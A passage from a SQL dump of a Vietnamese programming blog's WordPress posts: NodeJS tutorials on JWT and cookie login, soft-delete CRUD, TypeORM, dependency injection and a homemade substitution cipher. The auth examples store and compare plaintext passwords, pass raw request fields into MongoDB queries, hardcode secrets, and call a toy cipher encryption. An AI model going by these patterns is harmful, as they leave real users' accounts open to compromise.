cookie\n			let token = jwt.sign({ _id: newAccount._id }, process.env.SECRET_JWT);\n			res.cookie(\'accountID\', token, {\n				signed: true,\n			});\n\n			res.json({ data: response.ops[0] });\n		} catch (error) {\n			console.log(error);\n			res.json({ error: error });\n		}\n	};\n\n	login = async (req, res, next) => {\n		try {\n			let query = {\n				Gmail: req.body.Gmail,\n				Password: req.body.Password,\n			};\n			let account = await mongoDB.getDB().collection(\'accounts\').findOne(query);\n			console.log(\'Đăng nhập thành công\', account);\n\n			//Tạo token và lưu token vào cookie\n			let token = jwt.sign({ _id: account._id }, process.env.SECRET_JWT);\n			res.cookie(\'accountID\', token, {\n				signed: true,\n			});\n\n			res.json({ data: account });\n		} catch (error) {\n			console.log(error);\n			res.json({ error: error });\n		}\n	};\n\n	logout = (req, res, next) => {\n		//Xóa cookie\n		res.clearCookie(\'accountID\');\n		res.redirect(\'/\');\n	};\n}\n\nmodule.exports = new AccountController();\n\n</pre>\n\n', 'NodeJS – 9.2. Authentication:  jsonwebtoken và cookie-parser', '', 'publish', 'open', 'open', '', 'nodejs-9-2-authentication-jsonwebtoken-va-cookie-parser', '', '', '2021-05-09 03:00:01', '2021-05-08 20:00:01', '', 0, 'https://duycode.com/?p=808', 0, 'post', '', 0),
(813, 1, '2021-01-21 23:13:07', '2021-01-21 16:13:07', '<pre>\r\n  async getAdminByPermissions(permission: Permission) {\r\n    const query = this.adminRepository\r\n      .createQueryBuilder(\'user\')\r\n      .leftJoinAndSelect(\r\n        \'user_permission\',\r\n        \'permission\',\r\n        \'user.id = permission.user_id\',\r\n      )\r\n      .select([\r\n        \'user.id as id\',\r\n        \'user.email as email\',\r\n        \'user.is_root as is_root\',\r\n        \'permission.permission_id as permission_id\',\r\n      ])\r\n      .where(\'user.is_root = :isRoot\', { isRoot: true })\r\n      .orWhere(\'permission.permission_id = :permissionId\', {\r\n        permissionId: permission,\r\n      })\r\n\r\n    return await query.getRawMany()\r\n  }\r\n</pre>', 'NodeJS – TypeOrm Example', '', 'publish', 'open', 'open', '', 'nodejs-8-crud-update', '', '', '2023-01-04 10:52:40', '2023-01-04 10:52:40', '', 0, 'https://duycode.com/?p=813', 0, 'post', '', 0),
(822, 1, '2021-01-22 00:52:48', '2021-01-21 17:52:48', '<img src=\"https://techvccloud.mediacdn.vn/zoom/650_406/2018/11/30/crud-15435683934502144104962-crop-1543568398584927543865.png\" alt=\"\" />\nKhi delete dữ liệu, thường dùng kỹ thuật Soft Delete, bao gồm: \n- Delete (soft): xóa mềm\n- Restore: khôi phục\n- Force delete: xóa vĩnh viễn\n\n<h2>1. Sử dụng thư viện plugin delete cho mongoose</h1>\n-- mongoose-delete: <a href=\"https://www.npmjs.com/package/mongoose-delete\" rel=\"noopener\" target=\"_blank\">https://www.npmjs.com/package/mongoose-delete</a>\n<h3>1.1. Cài đặt:</h3>\n<pre>\nnpm install mongoose-delete\n</pre>\n\n<h3>1.2. Cấu hình Model</h3>\n<pre>\nconst mongoose = require(\'mongoose\');\n\nconst slug = require(\'mongoose-slug-generator\');\nconst mongooseDelete = require(\'mongoose-delete\');\n\nconst Schema = mongoose.Schema;\n\nconst Course = new Schema(\n    {\n        name: {type: String,require: true,default: \'\',minlength: 1,maxlength: 255,},\n        description: { type: String },\n        image: { type: String },\n        videoID: { type: String, require: true },\n        level: { type: String },\n        slug: { type: String, slug: \'name\', unique: true },\n    },\n    {\n        timestamps: true,\n    },\n);\n\n//Add plugins\nmongoose.plugin(slug);\nCourse.plugin(mongooseDelete, {\n    deletedAt: true,\n    overrideMethods: \'all\',\n});\n\n// module.exports = mongoose.model(\'ModelName\', mySchema)\nmodule.exports = mongoose.model(\'Course\', Course);\n\n</pre>\n\n\n<h2>2.  Router</h2>\n-- Tại ./src/routes/courses.js\n<pre>\nconst express = require(\'express\');\nconst router = express.Router();\n\nconst courseController = require(\'../app/controllers/CourseController\');\n\nrouter.get(\'/create\', courseController.create);\nrouter.post(\'/store\', courseController.store);\nrouter.get(\'/:id/edit\', courseController.edit);\nrouter.put(\'/:id\', courseController.update);\n\n//URL xóa mềm, khôi phục,và xóa vĩnh viễn khóa học: xxx123.com/course/:id\nrouter.delete(\'/:id\', courseController.destroy);\nrouter.patch(\'/:id/restore\', courseController.restore);\nrouter.delete(\'/:id/force\', courseController.forceDestroy);\n\nrouter.get(\'/trash\', courseController.trash);\n\nrouter.get(\'/:slug\', courseController.show);\nrouter.get(\'/\', courseController.index);\n\nmodule.exports = router;\n\n</pre>\n\n<h2>3. Controller</h2>\n-- Tại .src/app/controllers/CourseController.js\n<pre>\nconst Course = require(\'../models/Course\');\n\nclass CourseController {\n    //--[GET]-- /courses/course-list -> Gửi thêm biến \"deletedCount\"\n    courseList(req,res,next){\n        Promise.all([Course.find({}), Course.countDocumentsDeleted()])\n            .then(([courses, deletedCount]) =>\n                res.render(\'courses/course-list\', {\n                    deletedCount,\n                    courses: multipleMongooseToObject(courses),\n                })\n            )\n            .catch(next);\n    }\n\n    show(req,res,next){}\n    create(req, res, next) {}\n    store(req, res, next) {\n    edit(req, res, next) {}\n    update(req, res, next){}\n\n    //--[DELETE]-- /courses/:id\n    destroy(req, res, next) {\n        Course.delete({ _id: req.params.id })\n            .then(() => res.redirect(\'back\'))\n            .catch(next);\n    }\n\n    //--[DELETE]-- /courses/:id/force\n    forceDestroy(req, res, next) {\n        Course.deleteOne({ _id: req.params.id })\n            .then(() => res.redirect(\'back\'))\n            .catch(next);\n    }\n\n\n    //--[POST]-- /courses/handle-form-action -> delete nhiều item\n    handleFormAction(req, res, next) {\n        switch (req.body.action) {\n            case \'delete\':\n                Course.delete({ _id: {$in: req.body.courseIds} })\n                    .then(() => res.redirect(\'back\'))\n                    .catch(next);\n\n                break;\n            default: res.json({ message: \'Action is invalid\' });\n        }\n    }\n\n    //--[PATCH]-- /courses/:id/restore\n    restore(req, res, next) {\n        Course.restore({ _id: req.params.id })\n            .then(() => res.redirect(\'back\'))\n            .catch(next);\n    }\n\n    //--[GET]-- /courses/trash\n    trash(req, res, next) {\n        Course.findDeleted({})\n            .then((courses) =>\n                res.render(\'courses/course-list-trash\', {\n                    courses: multipleMongooseToObject(courses),\n                }),\n            )\n            .catch(next);\n    }\n}\n</pre>\n\n<h2>3. View</h2>\n-- Các view có sử dụng: Boostrap 5 (Modal, Table), Jquery\n<h3>3.1Tại .src/resources/views/courses/course-list.hbs</h3>\n<pre>\n<div class=\"mt4\">\n    <h2>Danh sách khóa học</h2>\n    <a href=\"/courses/create\" type=\"button\" class=\"btn btn-primary\">Đăng khóa học mới</a>\n    <a href=\"/courses/trash\" type=\"button\" class=\"btn btn-secondary\">Thùng rác ({{deletedCount}})</a>\n</div>\n\n<table class=\"table\">\n    <thead>\n        <tr>\n            <th scope=\"col\">#</th>\n            <th scope=\"col\">Tên khóa học</th>\n            <th scope=\"col\">Trình độ</th>\n            <th scope=\"col\">Thời gian tạo</th>\n            <th scope=\"col\">Action</th>\n        </tr>\n    </thead>\n    <tbody>\n\n        {{#each courses}}\n        <tr>\n            <th scope=\"row\">{{sum @index 1}}</th>\n            <td>{{this.name}}</td>\n            <td>{{this.level}}</td>\n            <td>{{this.createdAt}}</td>\n            <td>\n                <a href=\"/courses/{{this._id}}/edit\" class=\"btn btn-link\">Sửa</a>\n                <a href=\"\" class=\"btn btn-link\" data-bs-toggle=\"modal\" data-id=\"{{this._id}}\"\n                    data-bs-target=\"#delete-course-modal\">Xóa</a>\n            </td>\n        </tr>\n\n        {{else}}\n        <tr>\n            <td colspan=\"5\" class=\"text-center\">\n                Danh sách trống\n                <a href=\"/courses/create\" type=\"button\" class=\"btn btn-primary\">Đăng khóa học mới</a>\n            </td>\n        </tr>\n        {{/each}}\n    </tbody>\n</table>\n\n\n{{!-- confirm delete course --}}\n<div class=\"modal\" tabindex=\"-1\" id=\"delete-course-modal\">\n    <div class=\"modal-dialog\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <h5 class=\"modal-title\">Xóa khóa học ?</h5>\n                <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"modal\" aria-label=\"Close\"></button>\n            </div>\n            <div class=\"modal-body\">\n                <p>Bạn chắc chắn muốn xóa khóa học này ?</p>\n            </div>\n            <div class=\"modal-footer\">\n                <button id=\"btn-delete-course\" type=\"button\" class=\"btn btn-danger\">Xóa bỏ</button>\n                <button type=\"button\" class=\"btn btn-secondary\" data-bs-dismiss=\"modal\">Hủy</button>\n            </div>\n        </div>\n    </div>\n</div>\n\n{{!-- Delete hiden form --}}\n<form method=\"POST\" name=\"action-course-form\"></form>\n\n<script>\n    let courseDeleteID;\n    let modal = document.getElementById(\'delete-course-modal\');\n    let actionForm = document.forms[\'action-course-form\'];\n\n    modal.addEventListener(\'show.bs.modal\', function (event) {\n        let button = event.relatedTarget;\n        courseDeleteID = button.getAttribute(\'data-id\');\n    })\n\n    $(\"#btn-delete-course\").click(function () {\n        actionForm.action = \'/courses/\' + courseDeleteID + \'?_method=DELETE\';\n        actionForm.submit();\n    })\n</script>\n</pre>\n\n<h3>3.1Tại .src/resources/views/courses/course-list-trash.hbs</h3>\n<pre>\n<div class=\"mt-4\">\n    <div>\n        <a href=\"/courses\">Danh sách khóa học</a>\n        <h3>Khóa học đã xóa</h3>\n    </div>\n\n    <table class=\"table\">\n        <thead>\n            <tr>\n                <th scope=\"col\">#</th>\n                <th scope=\"col\">Tên khóa học</th>\n                <th scope=\"col\">Trình độ</th>\n                <th scope=\"col\">Thời gian xóa</th>\n                <th scope=\"col\">Action</th>\n            </tr>\n        </thead>\n        <tbody>\n\n            {{#each courses}}\n            <tr>\n                <th scope=\"row\">{{sum @index 1}}</th>\n                <td>{{this.name}}</td>\n                <td>{{this.level}}</td>\n                <td>{{this.deletedAt}}</td>\n                <td>\n                    <a href=\"\" class=\"btn btn-link btn-restore\" data-id=\"{{this._id}}\">Khôi phục</a>\n                    <a href=\"\" class=\"btn btn-link\" data-bs-toggle=\"modal\" data-id=\"{{this._id}}\"\n                        data-bs-target=\"#delete-course-modal\">Xóa vĩnh viễn</a>\n                </td>\n            </tr>\n\n            {{else}}\n            <tr>\n                <td colspan=\"5\" class=\"text-center\">\n                    Thùng rác trống\n                    <a href=\"/me/stored/courses\">Danh sách khóa học</a>\n                </td>\n            </tr>\n            {{/each}}\n        </tbody>\n    </table>\n</div>\n\n{{!-- confirm delete course --}}\n<div class=\"modal\" tabindex=\"-1\" id=\"delete-course-modal\">\n    <div class=\"modal-dialog\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <h5 class=\"modal-title\">Xóa khóa học ?</h5>\n                <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"modal\" aria-label=\"Close\"></button>\n            </div>\n            <div class=\"modal-body\">\n                <p>Hành động này không thể khôi phục. Bạn vẫn muốn xóa khóa học này ?</p>\n            </div>\n            <div class=\"modal-footer\">\n                <button id=\"btn-delete-course\" type=\"button\" class=\"btn btn-danger\">Xóa vĩnh viễn</button>\n                <button type=\"button\" class=\"btn btn-secondary\" data-bs-dismiss=\"modal\">Hủy</button>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n<form method=\"POST\" name=\"action-course-form\"></form>\n\n<script>\n    let courseDeleteID;\n    let modal = document.getElementById(\'delete-course-modal\');\n    let actionForm = document.forms[\'action-course-form\'];\n\n    modal.addEventListener(\'show.bs.modal\', function (event) {\n        let button = event.relatedTarget;\n        courseDeleteID = button.getAttribute(\'data-id\');\n    })\n\n    $(\'#btn-delete-course\').click(function (e) {\n        e.preventDefault();\n        actionForm.action = \'/courses/\' + courseDeleteID + \'/force?_method=DELETE\';\n        actionForm.submit();\n    })\n\n    $(\'.btn-restore\').click(function (e) {\n        e.preventDefault();\n        let id = $(this).data(\'id\')\n        actionForm.action = \'/courses/\' + id + \'/restore?_method=PATCH\';\n        actionForm.submit();\n    })\n</script>\n</pre>', 'NodeJS – 9. CRUD: Delete', '', 'publish', 'open', 'open', '', 'nodejs-9-crud-delete', '', '', '2021-01-22 00:52:48', '2021-01-21 17:52:48', '', 0, 'https://duycode.com/?p=822', 0, 'post', '', 0),
(824, 1, '2021-01-22 01:24:16', '2021-01-21 18:24:16', 'Các kiến thức sử dụng:\n - Cookies, signedCookies,\n - JWT\n\n<h2>1. Sử dụng JWT - jsonwebtoken</h2>\n- jwt: <a href=\"https://jwt.io/\" rel=\"noopener\" target=\"_blank\">https://jwt.io/</a>\n- npm: https://www.npmjs.com/package/jsonwebtoken\n<pre>\nnpm install jsonwebtoken\n</pre>\n<pre>\nvar jwt = require(\'jsonwebtoken\');\n\nvar data = {_id : \'duycode\'};\nvar token = jwt.sign(data,\'kjKJK#XC&*ZCDS#\', {\n    expiresIn: 30\n});\n\nvar tokenString = token;\nvar decode = jwt.verify(tokenString,\'kjKJK#XC&*ZCDS#\');\n \nconsole.log(token)\nconsole.log(decode)\n//eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiJkdXljb2RlIiwiaWF0IjoxNjExNzI5NjE3fQ.GSiTLZIqgUDyj-JdGZjo1lR72WBdajbNj96BxZAA3ms\n//{ _id: \'duycode\', iat: 1611730075, exp: 1611730105 }\n</pre>\n\n<h2>2. Sử dụng cookie-parser</h2>\n</pre>\nnpm install cookie-parser\n</pre>\n-- Khi login, lưu lại biến cookie\n<pre>\n   //--[POST]--    /login\n    loginStore(req, res, next) {\n        let gmail = req.body.gmail;\n        let password = req.body.password;\n        User.findOne({\n            gmail: gmail,\n            password: password,\n        })\n        .then((data)=>{\n            if(data){\n                let token = jwt.sign({_id: data._id},\'mktoken\');\n                res.cookie(\'userID\',token);\n                return res.redirect(\'/\');\n            }else{\n                return res.redirect(\'/login\');\n            }\n    \n        })\n        .catch(err=>{\n            return res.redirect(\'/login\');\n        })\n    }\n</pre>\n\n-- Dùng middleware để kiểm tra mỗi lần request, nếu có cookie rồi thì cho qua, nếu không có phải đăng nhập\n<pre>\nconst authMiddleware = require(\'../app/middlewares/AuthMiddleware\');\n    app.use(\'/admin\',authMiddleware.requireAuth, adminRouter);\n    app.use(\'/manager\',authMiddleware.requireAuth, managerRouter)\n</pre>\n--Middleware viết như sau:\n<pre>\nconst User = require(\'../models/User\');\nconst jwt = require(\'jsonwebtoken\');\n\nmodule.exports.requireAuth = function (req, res, next) {\n    if (!req.cookies.userID) {\n        res.redirect(\'/login\');\n    }\n\n    let userID;\n    try {\n        let token = req.cookies.userID;\n        userID = jwt.verify(token, \'mktoken\');\n    } catch (error) {\n        res.redirect(\"/login\")\n    }\n\n    if (userID) {\n        User.findById(userID)\n            .then(() => next())\n            .catch(err => {\n                return res.redirect(\'/login\');\n            })\n    }\n}\n</pre>\n\n<h1>II. Nhớ 2 </h1>\n<h2>1. Sử dụng thư viện</h1>\n1.1. JWT:\n-- Cài đặt: <a href=\"https://www.npmjs.com/package/jsonwebtoken\" rel=\"noopener\" target=\"_blank\">https://www.npmjs.com/package/jsonwebtoken</a>\n** Sử dụng:\n-- Đóng gói dữ liệu: { _id: user._id }\n<pre>\nlet token = jwt.sign(\n    { _id: user._id },\n    process.env.SECRET_JWT,\n    { expiresIn: 60 * 60 }\n);\n</pre>\n-- Giải nén dữ liệu: \n<pre>\nlet data = jwt.verify(token, process.env.SECRET_JWT)\n//data -> { _id: user._id }\n</pre>\n\n1.2. cookie-parser\n-- Cài đặt: <a href=\"https://www.npmjs.com/package/cookie-parser\" rel=\"noopener\" target=\"_blank\">https://www.npmjs.com/package/cookie-parser</a>\n\n-- Tại ./src/server.js\n<pre>\nconst cookieParser = require(\'cookie-parser\');\napp.use(cookieParser(process.env.SECRET_SIGNEDCOOKIES));\n</pre>\n-- Sử dụng:\n\n<pre>\n// Set cookie cho response, -> key: \'userID\'; value: token\nres.cookie(\'userID\', token, {\n    signed: true,\n});\n//Get cookie\nlet token = req.signedCookies.userID;\n//Delete cookie\nres.clearCookie(\'userID\');\n</pre>\n\n1.3. Khai báo thêm biến của .env hoặc trên Heroku\n<pre>\nSECRET_JWT=@%Abc@*678\nSECRET_SIGNEDCOOKIES=@$123%@#XYZ\n</pre>\n\n<h2>2. Register</h2>\n<pre>\nregisterStore(req, res, next) {\n    Object.assign(req.body, {\n        createdAt: Date.now(),\n        updatedAt: Date.now(),\n        removedAt: 0,\n        Role: \"Manager\",\n    })\n    const user = new User(req.body);\n    const phongkham = new PhongKham(req.body);\n\n    Promise.all([user.save(), phongkham.save()])\n        .then(([user, phongkham]) => {\n            Promise.all([\n                User.updateOne({ \'_id\': user._id }, { \'PhongKhamID\': phongkham._id }),\n                PhongKham.updateOne({ \'_id\': phongkham._id }, { \'QuanLyID\': user._id })\n            ])\n                .then(() => {\n                //tạo token trong 1 giờ\n                let token = jwt.sign(\n                    { _id: user._id },\n                    process.env.SECRET_JWT,\n                    { expiresIn: 60 * 60 }\n                );\n                res.cookie(\'userID\', token, {\n                    signed: true,\n                });\n                    return res.json(true);\n                })\n                .catch(() => {\n                    return res.json(false);\n                })\n        })\n        .catch(err => {\n            return res.json(false);\n        });\n}\n</pre>\n\n<h2>3. Login</h2>\n<pre>\nloginStore(req, res, next) {\n    User.findOne({\n        Gmail: req.body.Gmail,\n        Password: req.body.Password\n    })\n        .then((user) => {\n            if (user) {\n                //tạo token trong 1 giờ\n                let token = jwt.sign(\n                    { _id: user._id },\n                    process.env.SECRET_JWT,\n                    { expiresIn: 60 * 60 }\n                );\n                res.cookie(\'userID\', token, {\n                    signed: true,\n                });\n                return res.json(true);\n            } else {\n                return res.json(false);\n            }\n        })\n        .catch(err => {\n            return res.json(false);\n        })\n}\n</pre>\n\n<h2>4. Logout</h2>\n<pre>\nlogout(req, res, next) {\n    res.clearCookie(\'userID\');\n    res.redirect(\'/\')\n}\n</pre>', 'NodeJS – 10. Login', '', 'publish', 'open', 'open', '', 'nodejs-10-login', '', '', '2021-01-22 01:24:16', '2021-01-21 18:24:16', '', 0, 'https://duycode.com/?p=824', 0, 'post', '', 0),
(845, 1, '2022-11-05 02:00:07', '2022-11-05 02:00:07', 'Sự khác biệt giữa 3 khái niệm: Dependency Inversion Principle, Inversion of Control và Dependency Injection:\r\n- Dependency Inversion Principle (DIP): Đây là một nguyên lý để thiết kế và viết code.\r\n- Inversion of Control (IoC): Đây là một design pattern được tạo ra để code có thể tuân thủ nguyên lý Dependency Inversion. Có nhiều cách hiện thực pattern này: ServiceLocator, Event, Delegate, … Dependency Injection là một trong các cách đó.\r\n- Dependency Injection: Đây là một cách để hiện thực Inversion of Control Pattern (Có thể coi nó là một design pattern riêng cũng được). Các module phụ thuộc (dependency) sẽ được inject vào module cấp cao.\r\n\r\n<h3>1. Đặt vấn đề</h3>\r\n<pre>\r\n// Module cấp thấp\r\nclass CatRepository {\r\n    public getCatName(id: number | string): string {\r\n        return `Mina - ${id}` // we should get it from Database in real world\r\n    }\r\n}\r\n\r\n// Module cấp cao\r\nclass CatService {\r\n    // Lỗi 1: không sử dụng cụ thể 1 class\r\n    private readonly catRepository: CatRepository\r\n\r\n    constructor() {\r\n        // Lỗi 2: không khởi tạo 1 class bên trong 1 class khác \r\n        this.catRepository = new CatRepository()\r\n    }\r\n\r\n    getCatName(id: number | string): string {\r\n        return this.catRepository.getCatName(id)\r\n    }\r\n}\r\n\r\nconst catService = new CatService();\r\nconsole.log(catService.getCatName(4))  // Mina - 4\r\n\r\n// Code như trên sẽ gây sự ràng buộc chặt chẽ giữa 2 module\r\n</pre>\r\n\r\n<h3>2. Dependency Inversion Principle (DIP)</h3>\r\n<pre>\r\ninterface ICatRepository {\r\n    getCatName: (id: number | string) => string\r\n}\r\n\r\n// Module cấp thấp\r\nclass CatRepository implements ICatRepository {\r\n    public getCatName(id: number | string): string {\r\n        return `Mina - ${id}` // we should get it from Database in real world\r\n    }\r\n}\r\n\r\n// Module cấp cao\r\nclass CatService {\r\n    // Ràng buộc giữa 2 class thông qua interface\r\n    private readonly catRepository: ICatRepository\r\n\r\n    constructor() {\r\n        // Lỗi 2: không khởi tạo 1 class bên trong 1 class khác \r\n        this.catRepository = new CatRepository()\r\n    }\r\n\r\n    getCatName(id: number | string): string {\r\n        return this.catRepository.getCatName(id)\r\n    }\r\n}\r\n\r\nconst catService = new CatService();\r\nconsole.log(catService.getCatName(4))  // Mina - 4\r\n\r\n// Code như trên vẫn còn sự ràng buộc chặt chẽ giữa 2 module\r\n</pre>\r\n\r\n<h3>3. Factory Pattern</h3>\r\n<pre>\r\ninterface ICatRepository {\r\n    getCatName: (id: number | string) => string\r\n}\r\n\r\nclass CatRepositoryFactory {\r\n    static getCatRepository(): CatRepository {\r\n        return new CatRepository()\r\n    }\r\n}\r\n\r\n// Module cấp thấp hơn\r\nclass CatRepository implements ICatRepository {\r\n    public getCatName(id: number | string): string {\r\n        return `Mina - ${id}` // we should get it from Database in real world\r\n    }\r\n}\r\n\r\n// Module cấp cao hơn\r\nclass CatService {\r\n    // Ràng buộc giữa 2 class thông qua Interface\r\n    private readonly catRepository: ICatRepository\r\n\r\n    constructor() {\r\n        // Khởi tạo class thông qua Factory\r\n        this.catRepository = CatRepositoryFactory.getCatRepository()\r\n    }\r\n\r\n    getCatName(id: number | string): string {\r\n        return this.catRepository.getCatName(id)\r\n    }\r\n}\r\n\r\nconst catService = new CatService();\r\nconsole.log(catService.getCatName(4))  // Mina - 4\r\n\r\n// Khi thay đổi module cấp thấp sẽ không cần phải sửa lại module cấp cao, chỉ cần cập nhật Factory là được\r\n</pre>\r\n\r\n<h3>4. Dependency Injection</h3>\r\n<pre>\r\ninterface ICatRepository {\r\n    getCatName: (id: number | string) => string\r\n}\r\n\r\n// Module cấp thấp hơn\r\nclass CatRepository implements ICatRepository {\r\n    public getCatName(id: number | string): string {\r\n        return `Mina - ${id}` // we should get it from Database in real world\r\n    }\r\n}\r\n\r\n// Module cấp cao hơn\r\nclass CatService {\r\n    // Ràng buộc giữa 2 class thông qua Interface\r\n    private readonly catRepository: ICatRepository;\r\n\r\n    // Khởi tạo class bằng cách Inject qua Contructor\r\n    constructor(catRepository: ICatRepository) {\r\n        this.catRepository = catRepository\r\n    }\r\n\r\n    getCatName(id: number | string): string {\r\n        return this.catRepository.getCatName(id)\r\n    }\r\n}\r\n\r\n// Trách nhiệm khởi tạo các Class ở DIContainer\r\nclass DIContainer {\r\n    private readonly catService: CatService\r\n    constructor() {\r\n        this.catService = new CatService(new CatRepository())\r\n        console.log(this.catService.getCatName(4))  // Mina - 4\r\n    }\r\n}\r\n\r\nnew DIContainer()\r\n\r\n// Khi thay đổi module cấp thấp sẽ không cần phải sửa lại module cấp cao, chỉ cần cập nhật Container là được\r\n\r\n</pre>\r\n', 'Design Pattern: IOC - Inversion of Control', '', 'publish', 'open', 'open', '', 'design-pattern-inversion-of-control', '', '', '2023-06-17 12:24:31', '2023-06-17 12:24:31', '', 0, 'https://duycode.com/?p=845', 0, 'post', '', 0),
(859, 1, '2021-05-09 00:00:47', '2021-05-08 17:00:47', '<h2>1. View</h2>\n1. Tạo file ./src/resources/views/account/account-register.ejs\n<pre>\n<input type=\"text\" name=\"Gmail\" placeholder=\"Username\" required />\n<input type=\"text\" name=\"Phone\" placeholder=\"0xxx.xxx.xxx\" required />\n<input type=\"password\" name=\"Password\" placeholder=\"Password\" autocomplete=\"off\" required />\n<button id=\"btn_Register\">Register</button>\n\n<script>\n	let ip_Gmail = document.querySelector(\'input[name=\"Gmail\"]\');\n	let ip_Phone = document.querySelector(\'input[name=\"Phone\"]\');\n	let ip_Password = document.querySelector(\'input[name=\"Password\"]\');\n	let btn_Register = document.getElementById(\'btn_Register\');\n\n	btn_Register.onclick = (e) => {\n		e.preventDefault();\n		if (ip_Gmail.value == \'\' || ip_Phone.value == \'\' || ip_Password.value == \'\') return;\n\n		let account = {\n			Gmail: ip_Gmail.value + \'@gmail.com\',\n			Phone: \'0\' + ip_Phone.value,\n			Password: ip_Password.value,\n		};\n\n		fetch(\'/account/register\', {\n			method: \'POST\',\n			body: JSON.stringify(account),\n			headers: {\n				\'Content-Type\': \'application/json\',\n			},\n		})\n			.then((response) => response.json())\n			.then((resp) => {\n				console.log(resp);\n				if (resp.error) alert(\'Tạo tài khoản thất bại, lỗi hệ thống\');\n				else if (!resp.data) alert(\'Đăng ký thất bại, tên tài khoản trùng khớp\');\n				else if (resp.data) {\n					alert(\'Tạo tài khoản thành công\');\n					window.open(\'/\', \'_self\');\n				}\n			})\n			.catch((err) => console.warn(err));\n	};\n</script>\n\n</pre>\n\n2. Tạo file ./src/resources/views/account/account-login.ejs\n<pre>\n<input type=\"text\" name=\"Gmail\" placeholder=\"Username\" required />\n<input type=\"password\" name=\"Password\" placeholder=\"Password\" autocomplete=\"off\" required />\n<button id=\"btn_Login\">Login</button>\n\n<script>\n	let ip_Gmail = document.querySelector(\'input[name=\"Gmail\"]\');\n	let ip_Password = document.querySelector(\'input[name=\"Password\"]\');\n	let btn_Login = document.getElementById(\'btn_Login\');\n\n	btn_Login.onclick = (e) => {\n		e.preventDefault();\n		if (ip_Gmail.value == \'\' || ip_Password == \'\') return;\n\n		let account = {\n			Gmail: ip_Gmail.value + \'@gmail.com\',\n			Password: ip_Password.value,\n		};\n\n		fetch(\'/account/login\', {\n			method: \'POST\',\n			body: JSON.stringify(account),\n			headers: {\n				\'Content-Type\': \'application/json\',\n			},\n		})\n			.then((response) => response.json())\n			.then((resp) => {\n				console.log(resp);\n				if (resp.error) alert(\'Đăng nhập thất bại, lỗi hệ thống\');\n				else if (!resp.data) alert(\'Đăng nhập thất bại, sai thông tin\');\n				else if (resp.data){\n					alert(\'Đăng nhập thành công\');\n					window.open(\'/\',\'_self\');\n				} \n			})\n			.catch((err) => console.warn(err));\n	};\n</script>\n\n\n</pre>\n\n<h2>2. Router</h2>\n- Tạo ./src/routes/accountRouter.ejs\n<pre>\nconst express = require(\'express\');\nconst router = express.Router();\n\nconst controller = require(\'../app/controllers/AccountController\');\n\nrouter.get(\'/register\', (req, res, next)=>{\n    res.render(\'account/account-register\');\n});\nrouter.get(\'/login\', (req, res, next)=>{\n    res.render(\'account/account-login\');\n});\n\n\nrouter.post(\'/register\', controller.register);\nrouter.post(\'/login\', controller.login)\nrouter.get(\'/logout\', controller.logout);\nmodule.exports = router;\n</pre>\n\n<h2>3. Controller</h2>\n- Tạo file ./src/app/controllers/AccountController.js\n<pre>\nconst mongoDB = require(\'../../config/database/mongoDB\');\n\nclass AccountController {\n	register = async (req, res, next) => {\n		try {\n			let newAccount = {\n				Gmail: req.body.Gmail,\n				Phone: req.body.Phone,\n				Password: req.body.Password,\n				Role: \'Manager\',\n\n				createdAt: Date.now(),\n				updatedAt: Date.now(),\n				removedAt: 0,\n			};\n			let findAccount = await mongoDB.getDB().collection(\'accounts\').findOne({ Gmail: req.body.Gmail });\n			if (findAccount) {\n				res.json({ data: null });\n			} else {\n				let response = await mongoDB.getDB().collection(\'accounts\').insertOne(newAccount);\n				console.log(\'Tạo tài khoản mới thành công: \', response.ops);\n				res.json({ data: response.ops[0] });\n			}\n		} catch (error) {\n			console.log(error);\n			res.json({ error: error });\n		}\n	};\n\n	login = async (req, res, next) => {\n		try {\n			let query = {\n				Gmail: req.body.Gmail,\n				Password: req.body.Password,\n			};\n			let account = await mongoDB.getDB().collection(\'accounts\').findOne(query);\n			if (account) {\n			}\n			res.json({ data: account });\n		} catch (error) {\n			console.log(error);\n			res.json({ error: error });\n		}\n	};\n\n	logout = (req, res, next) => {};\n}\n\nmodule.exports = new AccountController();\n\n</pre>', 'NodeJS – 9.1. Authentication: Register account', '', 'publish', 'open', 'open', '', 'nodejs-9-1-authentication-register-account', '', '', '2021-05-09 00:00:47', '2021-05-08 17:00:47', '', 0, 'https://duycode.com/?p=859', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(865, 1, '2021-02-03 22:59:29', '2021-02-03 15:59:29', '<h2>1. MyString</h2>\r\n<pre>\r\nclass MyString {\r\n    public static readonly charset =\r\n        \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\'\r\n\r\n    public static generateCharset = (privateKey: string, charset?: string): string => {\r\n        let tempString = charset || this.charset\r\n        let result = \'\'\r\n        for (let i = 0; i < this.charset.length; i += 1) {\r\n            const kIndex = i % privateKey.length\r\n            const charCode = privateKey.charCodeAt(kIndex)\r\n            const tIndex = charCode % tempString.length\r\n\r\n            result = tempString[tIndex] + result\r\n            tempString = tempString.substring(0, tIndex) + tempString.substring(tIndex + 1)\r\n        }\r\n        return result\r\n    }\r\n\r\n    public static randomString = (length: number, charset?: string) => {\r\n        const characters = charset || this.charset\r\n        let result = \'\'\r\n        for (let i = 0; i < length; i += 1) {\r\n            result += characters.charAt(Math.floor(Math.random() * characters.length))\r\n        }\r\n        return result\r\n    }\r\n\r\n    public static encript = (rootString: string, privateKey: string): string => {\r\n        const hash = this.generateCharset(privateKey)\r\n        let result = \'\'\r\n        for (let i = 0; i < rootString.length; i += 1) {\r\n            const index = this.charset.indexOf(rootString[i])\r\n            if (index === -1) {\r\n                result += rootString[i]\r\n            } else {\r\n                result += hash[index]\r\n            }\r\n        }\r\n        return result\r\n    }\r\n\r\n    public static decript = (cipherText: string, privateKey: string): string => {\r\n        const hash = this.generateCharset(privateKey)\r\n        let result = \'\'\r\n        for (let i = 0; i < cipherText.length; i += 1) {\r\n            const index = hash.indexOf(cipherText[i])\r\n            if (index === -1) 